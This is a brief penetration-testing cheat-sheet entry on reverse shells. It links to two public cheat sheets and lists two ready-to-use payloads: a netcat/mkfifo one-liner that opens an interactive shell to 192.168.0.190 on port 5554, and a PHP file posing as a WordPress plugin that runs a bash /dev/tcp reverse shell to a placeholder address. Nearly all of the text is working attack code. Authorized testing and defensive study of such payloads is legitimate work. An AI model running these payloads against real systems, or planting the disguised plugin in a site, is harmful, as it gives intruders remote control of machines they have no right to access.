### reverse_shell payloads

Link: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet



#### Shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```


#### PHP

```
<?php
/**
 * Plugin Name: Wordpress Reverse Shell
 * Author: azkrath
 */
exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<IP>/<Port> 0>&1’”)
?>
```